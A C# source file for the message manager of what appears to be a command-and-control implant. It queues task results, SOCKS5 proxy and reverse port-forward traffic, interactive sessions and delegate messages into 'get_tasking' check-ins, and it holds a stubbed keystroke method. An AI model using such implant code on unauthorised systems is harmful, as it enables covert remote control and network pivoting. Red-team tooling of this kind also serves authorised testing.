using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using Renci.SshNet.Common;
using System.Collections.Concurrent;
using System.Drawing;
using System.Text.Json;

namespace Agent.Managers
{
    public class MessageManager : IMessageManager
    {
        private ConcurrentDictionary<string, ResponseResult> responseResults = new ConcurrentDictionary<string, ResponseResult>();
        private ConcurrentBag<string> responseStrings = new ConcurrentBag<string>();
        private ConcurrentDictionary<string, ProcessResponseResult> processResults = new ConcurrentDictionary<string, ProcessResponseResult>();
        private ConcurrentDictionary<string, FileBrowserResponseResult> fileBrowserResults = new ConcurrentDictionary<string, FileBrowserResponseResult>();
        private ConcurrentDictionary<int, ServerDatagram> socksOut = new ConcurrentDictionary<int, ServerDatagram>();
        private ConcurrentDictionary<int, ServerDatagram> rpfwdOut = new ConcurrentDictionary<int, ServerDatagram>();
        private ConcurrentBag<InteractMessage> interactiveOut = new ConcurrentBag<InteractMessage>();
        private ConcurrentBag<DelegateMessage> delegateMessages = new ConcurrentBag<DelegateMessage>();
        private ConcurrentDictionary<string, ServerJob> activeJobs = new ConcurrentDictionary<string, ServerJob>();
        private StringWriter sw = new StringWriter();
        private bool stdOutIsMonitored = false;
        private string monitoring_task = "";
        private TextWriter origStdOut;
        private ILogger logger { get; set; }

        public MessageManager(ILogger logger)
        {
            this.logger = logger;
        }
        public async Task AddKeystroke(string window_title, string task_id, string key)
        {
            throw new NotImplementedException();
        }
        public async Task AddResponse(DelegateMessage dm)
        {
            this.delegateMessages.Add(dm);
            return;
        }
        public async Task AddResponse(InteractMessage im)
        {
            this.interactiveOut.Add(im);
        }
        public async Task AddResponse(DatagramSource source, ServerDatagram dg)
        {
            switch (source)
            {
                case DatagramSource.Socks5:
                    AddSocksMessage(dg);
                    break;
                case DatagramSource.RPortFwd:
                    AddRpfwdMessage(dg);
                    break;
                default:
                    break;
            }
        }
        private void AddSocksMessage(ServerDatagram dg)
        {
            socksOut.AddOrUpdate(dg.server_id, dg, (existingKey, existingValue) =>
            {
                // Key exists, update the existing ServerDatagram by adding bdata values
                existingValue.bdata = Misc.CombineByteArrays(existingValue.bdata, dg.bdata);
                //existingValue.bdata = Misc.CombineByteArrays(dg.bdata, existingValue.bdata);
                if (!existingValue.exit && dg.exit)
                {
                    existingValue.exit = true;
                }
                existingValue.data = Misc.Base64Encode(existingValue.bdata);
                return existingValue;
            });
        }
        private void AddRpfwdMessage(ServerDatagram dg)
        {
            rpfwdOut.AddOrUpdate(dg.server_id, dg, (existingKey, existingValue) =>
            {
                // Key exists, update the existing ServerDatagram by adding bdata values
                existingValue.bdata = Misc.CombineByteArrays(existingValue.bdata, dg.bdata);
                //existingValue.bdata = Misc.CombineByteArrays(dg.bdata, existingValue.bdata);
                if (!existingValue.exit && dg.exit)
                {
                    existingValue.exit = true;
                }
                existingValue.data = Misc.Base64Encode(existingValue.bdata);
                return existingValue;
            });
        }
        public async Task AddResponse(ResponseResult res)
        {
            if (!responseResults.ContainsKey(res.task_id))
            {
                responseResults.TryAdd(res.task_id, res);
            }

            ResponseResult newResponse = responseResults[res.task_id];

            if (!res.completed)
            {
                newResponse.completed = res.completed;
            }

            if (!string.IsNullOrEmpty(res.status))
            {
                newResponse.status = res.status;
            }
        }
        public async Task AddResponse(FileBrowserResponseResult res)
        {
            if (!fileBrowserResults.ContainsKey(res.task_id))
            {
                fileBrowserResults.TryAdd(res.task_id, res);
            }

            FileBrowserResponseResult newResponse = fileBrowserResults[res.task_id];

            if (!res.completed)
            {
                newResponse.completed = res.completed;
            }

            if (!string.IsNullOrEmpty(res.status))
            {
                newResponse.status = res.status;
            }
        }
        public async Task AddResponse(ProcessResponseResult res)
        {
            if (!processResults.ContainsKey(res.task_id))
            {
                processResults.TryAdd(res.task_id, res);
                return;
            }

            ProcessResponseResult newResponse = processResults[res.task_id];
            if (!res.completed)
            {
                newResponse.completed = res.completed;
            }

            if (!string.IsNullOrEmpty(res.status))
            {
                newResponse.status = res.status;
            }
        }
        public async Task AddResponse(string res)
        {
            responseStrings.Add(res);
        }
        public List<string> GetTaskResponsesAsync()
        {
            List<string> results = new List<string>();

            foreach (ResponseResult response in responseResults.Values)
            {

                if (response.completed)
                {
                    activeJobs.Remove(response.task_id, out _);
                }
                results.Add(response.ToJson());
            }
            foreach (ProcessResponseResult response in processResults.Values)
            {
                if (response.completed)
                {
                    activeJobs.Remove(response.task_id, out _);
                }
                results.Add(response.ToJson());
            }
            foreach (FileBrowserResponseResult response in fileBrowserResults.Values)
            {
                if (response.completed)
                {
                    activeJobs.Remove(response.task_id, out _);
                }
                results.Add(response.ToJson());
            }
            foreach (string response in responseStrings)
            {
                results.Add(response);
            }

            fileBrowserResults.Clear();
            responseResults.Clear();
            processResults.Clear();
            responseStrings.Clear();

          return results;
        }
        public async Task Write(string? output, string task_id, bool completed, string status)
        {
            responseResults.AddOrUpdate(task_id, new ResponseResult { user_output = output, completed = completed, status = status, task_id = task_id }, (k, t) =>
            {
                ResponseResult newResponse = t;
                newResponse.user_output += output;
                if (completed)
                {
                    newResponse.completed = true;
                }
                if (!string.IsNullOrEmpty(status))
                {
                    newResponse.status = status;
                }
                return newResponse;
            });
        }
        public async Task Write(string? output, string task_id, bool completed)
        {
            await this.Write(output, task_id, completed, "");
        }
        public async Task WriteLine(string? output, string task_id, bool completed, string status)
        {
            responseResults.AddOrUpdate(task_id, new ResponseResult { user_output = output + Environment.NewLine, completed = completed, status = status, task_id = task_id }, (k, t) =>
            {
                var newResponse = (ResponseResult)t;
                newResponse.user_output += output + Environment.NewLine;
                if (completed)
                {
                    newResponse.completed = true;
                }
                if (!string.IsNullOrEmpty(status))
                {
                    newResponse.status = status;
                }
                return newResponse;
            });
        }
        public async Task WriteLine(string? output, string task_id, bool completed)
        {
            await WriteLine(output, task_id, completed, "");
        }
        public void AddJob(ServerJob job)
        {
            logger.Log("Adding job with ID: " + job.task.id);
            this.activeJobs.TryAdd(job.task.id, job);
        }
        public bool TryGetJob(string task_id, out ServerJob job)
        {
            try
            {
                job = this.activeJobs.FirstOrDefault(x => x.Key == task_id).Value;

                if(job == null)
                {
                    return false;
                }

                return true;
            }
            catch (Exception e)
            {
                job = null;
                return false;
            }
        }
        public Dictionary<string, ServerJob> GetJobs()
        {
            return this.activeJobs.ToDictionary(kvp => kvp.Key, kvp => kvp.Value, this.activeJobs.Comparer);
        }
        public void CompleteJob(string task_id)
        {
            activeJobs.TryRemove(task_id, out _);
        }
        public async Task<string> GetAgentResponseStringAsync()
        {
            GetTasking gt = new GetTasking()
            {
                action = "get_tasking",
                tasking_size = -1,
                delegates = delegateMessages.ToList(),
                socks = this.socksOut.Values.ToList(),
                responses = this.GetTaskResponsesAsync(),
                rpfwd = this.rpfwdOut.Values.ToList(),
                interactive = this.interactiveOut.ToList(),
            };

            this.socksOut.Clear();
            this.rpfwdOut.Clear();
            this.delegateMessages.Clear();
            this.interactiveOut.Clear();

            return JsonSerializer.Serialize(gt, GetTaskingJsonContext.Default.GetTasking);
        }
        public bool HasResponses()
        {
            if(this.responseResults.Count > 0)
            {
                logger.Log($"responseResults Results: {this.responseResults.Count} ");
            }
            if (this.processResults.Count > 0)
            {
                logger.Log($"processResults Results: {this.processResults.Count} ");
            }
            if (this.fileBrowserResults.Count > 0)
            {
                logger.Log($"fileBrowserResults Results: {this.fileBrowserResults.Count} ");
            }
            if (this.responseStrings.Count > 0)
            {
                logger.Log($"responseStrings Results: {this.responseStrings.Count} ");
            }
            if (this.delegateMessages.Count > 0)
            {
                logger.Log($"delegateMessages Results: {this.delegateMessages.Count} ");
            }
            if (this.socksOut.Count > 0)
            {
                logger.Log($"socksOut Results: {this.socksOut.Count} ");
            }
            if (this.rpfwdOut.Count > 0)
            {
                logger.Log($"rpfwdOut Results: {this.rpfwdOut.Count} ");
            }

         return this.responseResults.Count > 0 || this.processResults.Count > 0 || this.fileBrowserResults.Count > 0 
                || this.responseStrings.Count > 0 || this.delegateMessages.Count > 0 || this.socksOut.Count > 0 
                || this.rpfwdOut.Count > 0;
        }
        public bool CaptureStdOut(string task_id)
        {
            throw new NotImplementedException();
        }
        public bool ReleaseStdOut()
        {
            throw new NotImplementedException();
        }
        public bool StdIsBusy()
        {
            throw new NotImplementedException();
        }
    }
}
